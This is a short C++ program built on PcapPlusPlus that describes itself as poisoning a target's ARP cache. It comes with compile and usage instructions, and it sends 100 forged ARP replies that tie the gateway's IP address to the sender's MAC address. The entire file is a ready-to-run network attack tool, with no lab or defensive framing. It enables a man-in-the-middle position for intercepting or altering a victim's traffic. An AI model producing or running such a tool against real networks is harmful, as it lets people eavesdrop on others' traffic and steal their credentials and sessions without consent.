// ============================================================
// arp_spoof.cpp — poison target's ARP cache
// ------------------------------------------------------------
// Deps:    brew install pcapplusplus
// Compile: clang++ -std=c++17 -O2 -o arp_spoof arp_spoof.cpp \
//          -I/opt/homebrew/include -L/opt/homebrew/lib \
//          -lPcap++ -lPacket++ -lCommon++ -lpcap
// Usage:   sudo ./arp_spoof <iface> <target_ip> <gateway_ip>
// ============================================================
#include "PcapLiveDeviceList.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "IPv4Layer.h"
#include "Packet.h"
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char** argv) {
    if (argc < 4) { std::printf("usage: %s <iface> <target> <gw>\n", argv[0]); return 1; }
    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
    if (!dev || !dev->open()) return 1;

    pcpp::MacAddress myMac = dev->getMacAddress();
    pcpp::MacAddress targetMac("ff:ff:ff:ff:ff:ff");
    pcpp::IPv4Address target(argv[2]);
    pcpp::IPv4Address gw(argv[3]);

    for (int i = 0; i < 100; i++) {
        pcpp::EthLayer eth(myMac, targetMac, PCPP_ETHERTYPE_ARP);
        pcpp::ArpLayer arp(pcpp::ARP_REPLY, myMac, targetMac, gw, target);
        pcpp::Packet pkt(100);
        pkt.addLayer(&eth); pkt.addLayer(&arp);
        pkt.computeCalculateFields();
        dev->sendPacket(&pkt);
        std::printf("[+] sent ARP reply %d\n", i);
        sleep(2);
    }
    dev->close();
    return 0;
}
